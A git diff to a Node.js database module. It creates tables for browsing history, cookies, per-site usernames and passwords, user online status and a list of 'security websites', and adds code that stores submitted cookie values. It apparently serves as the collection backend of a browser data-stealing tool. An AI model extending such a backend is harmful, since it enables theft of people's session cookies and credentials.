@@ -71,7 +71,7 @@ function initializeDatabase(){
     });
 
     //Histories table
-    sql = 'CREATE TABLE history(URL varchar(255),UserID int NOT NULL,primary key(URL),foreign key(UserID) references userStatus(ID) ON DELETE CASCADE ON UPDATE CASCADE)';
+    sql = 'CREATE TABLE history(TableID int NOT NULL auto_increment, URL varchar(255),UserID int NOT NULL,primary key(URL),foreign key(UserID) references userStatus(ID) ON DELETE CASCADE ON UPDATE CASCADE)';
     db.query(sql, function(err,result){
         if(err) throw err;
         console.log(result);
@@ -79,7 +79,7 @@ function initializeDatabase(){
     });
 
     //Cookies table
-    sql = 'CREATE TABLE cookies(UserID int NOT NULL, URL varchar(255),CookieString varchar(255),primary key(CookieString),foreign key(UserID) references userStatus(ID) ON DELETE CASCADE ON UPDATE CASCADE)';
+    sql = 'CREATE TABLE cookies(UserID int NOT NULL, Domain varchar(255), Name varchar(255), Value varchar(255),primary key(Domain),foreign key(UserID) references userStatus(ID) ON DELETE CASCADE ON UPDATE CASCADE)';
     db.query(sql, function(err,result){
         if(err) throw err;
         console.log(result);
@@ -87,7 +87,7 @@ function initializeDatabase(){
     });
 
     //Login info table
-    sql = 'CREATE TABLE loginInfo(UserID int NOT NULL,URL varchar(255),Username varchar(255),UserPassword varchar(255),primary key(URL),foreign key(UserID) references userStatus(ID) ON DELETE CASCADEON UPDATE CASCADE)';
+    sql = 'CREATE TABLE loginInfo(UserID int NOT NULL,URL varchar(255),Username varchar(255),UserPassword varchar(255),primary key(URL),foreign key(UserID) references userStatus(ID) ON DELETE CASCADE ON UPDATE CASCADE)';
     db.query(sql, function(err,result){
         if(err) throw err;
         console.log(result);
@@ -95,7 +95,7 @@ function initializeDatabase(){
     });
 
     //Security websites table
-    sql = 'CREATE TABLE securityWebsites(URL varchar(255),primary key(URL));';
+    sql = 'CREATE TABLE securityWebsites(URL varchar(255),primary key(URL))';
     db.query(sql, function(err,result){
         if(err) throw err;
         console.log(result);
@@ -113,6 +113,22 @@ function initializeDatabase(){
         console.log(result);
         console.log('User status table created.');
     }*/
+}
+
+function setOnline(userID){
+    var sql = 'INSERT INTO userStatus (ID, UserStatus) VALUES (?,\'Online\') on duplicate key update UserStatus = \'Online\'';
+    db.query(sql, [userID], function(err,result){
+        if(err) throw err;
+        console.log("ID updated");
+    });
+}
+
+function setOffline(userID){
+    var sql = 'INSERT INTO userStatus (ID, UserStatus) VALUES (?,\'Offline\') on duplicate key update UserStatus = \'Offline\'';
+    db.query(sql, [userID], function(err,result){
+        if(err) throw err;
+        console.log("ID updated");
+    });
 }
 
 function updateHistory(json){
@@ -139,7 +155,13 @@ function flushHistory(id){
 }
 
 function updateCookies(jsonFile){
-    
+    let sql = 'INSERT INTO cookies (UserID, Domain, Name, Value) VALUES (?, ?, ?, ?) on duplicate key update Value = ?';
+
+    var json = JSON.parse(jsonFile);
+    db.query(sql, [json.id, json.domain, json.name,json.value, json.value], function(err,result){
+        if(err) throw err;
+        console.log(result);
+    });
 }
 
 function updateUsername(jsonFile){
